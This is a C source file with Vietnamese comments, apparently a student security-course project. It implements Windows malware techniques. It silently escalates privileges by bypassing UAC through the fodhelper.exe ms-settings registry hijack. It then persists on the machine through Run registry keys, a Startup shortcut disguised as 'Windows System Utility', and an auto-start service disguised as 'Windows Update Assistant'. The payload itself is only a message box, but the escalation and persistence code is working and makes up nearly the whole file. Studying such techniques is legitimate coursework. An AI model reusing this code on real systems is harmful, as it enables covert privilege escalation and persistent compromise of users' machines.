#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <intrin.h>
#include <psapi.h>
#include <objbase.h>
#include <shlguid.h>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// --- ADMIN RIGHTS ESCALATION ---
// Hàm kiểm tra xem tiến trình hiện tại đã có quyền Admin chưa
BOOL IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID AdminSid = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    // Tạo SID cho nhóm Administrators để kiểm tra membership rồi trả về kết quả
    // Nếu tiến trình đang chạy với quyền Admin, hàm sẽ trả về TRUE
    // Nếu không, hàm sẽ trả về FALSE, và chúng ta có thể yêu cầu quyền Admin sau đó
    // Hàm FreeSid sẽ được gọi để giải phóng bộ nhớ sau khi kiểm tra xong
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdminSid)) {
        CheckTokenMembership(NULL, AdminSid, &fIsRunAsAdmin);
        FreeSid(AdminSid);
    }
    return fIsRunAsAdmin;
}

// Hàm leo quyền Admin nếu chưa có
void BypassUAC() {
    HKEY hKey;
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    // Tạo cấu trúc Registry giả mạo ms-settings
    // Đường dẫn: HKCU\Software\Classes\ms-settings\Shell\Open\command
    const char* regPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        // Thiết lập lệnh thực thi là chính file mã độc này
        RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE*)szPath, (DWORD)strlen(szPath) + 1);
        
        // Thiết lập DelegateExecute là chuỗi trống
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);

        // Kích hoạt fodhelper.exe (một binary có quyền Auto-Elevate)
        // Khi chạy, fodhelper sẽ đọc Registry chúng ta vừa ghi và chạy mã độc với quyền Admin ngầm
        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
        
        // Thoát bản quyền thấp
        exit(0);
    }
}

// --- PAYLOAD VÀ PERSISTENCE ---
void runPayload() {
    // Hiển thị thông tin nhóm để xác nhận payload đã chạy thành công
    MessageBoxA(NULL, 
        "22520810 - Huynh Bao Long, 22520432 - Do Dang Hieu, 23520860 - Nguyen Quang Loc", 
        "Nhom 10 - NT230.Q22", 
        MB_OK | MB_ICONINFORMATION);
}

HRESULT CreateShortcut(LPCSTR pszPathObj, LPCSTR pszPathLink, LPCSTR pszDesc) {
    HRESULT hres;
    IShellLink* psl;

    // Khởi tạo thư viện COM
    CoInitialize(NULL);

    // Tạo một thực thể của đối tượng ShellLink
    hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hres)) {
        IPersistFile* ppf;

        // Thiết lập đường dẫn đến file thực thi và mô tả
        psl->lpVtbl->SetPath(psl, pszPathObj);
        psl->lpVtbl->SetDescription(psl, pszDesc);

        // Truy vấn IPersistFile để lưu shortcut
        hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hres)) {
            WCHAR wsz[MAX_PATH];
            // Chuyển đổi đường dẫn sang Unicode
            MultiByteToWideChar(CP_ACP, 0, pszPathLink, -1, wsz, MAX_PATH);

            // Lưu tệp .lnk
            hres = ppf->lpVtbl->Save(ppf, wsz, TRUE);
            ppf->lpVtbl->Release(ppf);
        }
        psl->lpVtbl->Release(psl);
    }
    CoUninitialize();
    return hres;
}

void setupPersistence() {
    char szPath[MAX_PATH];
    char szAppDataPath[MAX_PATH];
    
    // Lấy đường dẫn hiện tại của executable
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    // Sao chép tệp vào AppData để đảm bảo persistence
    GetEnvironmentVariableA("APPDATA", szAppDataPath, MAX_PATH);
    strcat_s(szAppDataPath, MAX_PATH, "\\Nhom10\\");
    CreateDirectoryA(szAppDataPath, NULL);
    strcat_s(szAppDataPath, MAX_PATH, "Nhom10.exe");
    
    if (!CopyFileA(szPath, szAppDataPath, FALSE)) {
        strcpy_s(szAppDataPath, MAX_PATH, szPath);  // Nếu copy fail, dùng path cũ
    }

    // Registry Persistence - Chạy tại startup
    HKEY hKey;

    // Nếu có quyền Admin, đăng ký persistence ở HKLM để chạy cho tất cả người dùng
    // Nếu không, đăng ký ở HKCU để chạy cho người dùng hiện tại
    if (IsRunAsAdmin()) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Nhom10GlobalAgent", 0, REG_SZ, (const BYTE*)szPath, strlen(szPath) + 1);
            RegCloseKey(hKey);
        }
    }
    else {
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Nhom10Popup", 0, REG_SZ, (const BYTE*)szAppDataPath, strlen(szAppDataPath) + 1);
            RegCloseKey(hKey);
        }
    }

    // Startup Folder Persistence (không cần admin)
    char szStartup[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup) == S_OK) {
        char szShortcutPath[MAX_PATH];
        sprintf_s(szShortcutPath, MAX_PATH, "%s\\Nhom10.lnk", szStartup);
        
        // // Tạo shortcut trỏ từ thư mục Startup về file EXE trong AppData
        CreateShortcut(szAppDataPath, szShortcutPath, "Windows System Utility");
    }

    // Service Persistence (Yêu cầu quyền Admin)
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (schSCManager) {
        // Kiểm tra xem service đã tồn tại chưa
        SC_HANDLE schService = OpenServiceA(schSCManager, "Nhom10Service", SERVICE_ALL_ACCESS);
        
        if (schService == NULL) {
            // Nếu chưa tồn tại thì mới tạo mới
            schService = CreateServiceA(
                schSCManager, 
                "Nhom10Service",             // Tên định danh (Internal name)
                "Windows Update Assistant",   // Tên hiển thị giả mạo (Display name)
                SERVICE_ALL_ACCESS, 
                SERVICE_WIN32_OWN_PROCESS, 
                SERVICE_AUTO_START,          // Tự động chạy khi boot
                SERVICE_ERROR_NORMAL, 
                szAppDataPath,               // Đường dẫn tệp tin
                NULL, NULL, NULL, NULL, NULL
            );
        }
        if (schService) CloseServiceHandle(schService);
        CloseServiceHandle(schSCManager);
    }
}

int main() {
    // Yêu cầu quyền Admin để đảm bảo persistence trong service
    if (!IsRunAsAdmin()) {
        BypassUAC();
    }

    // Thực hiện Payload và bám rễ
    setupPersistence();
    runPayload();

    return 0;
}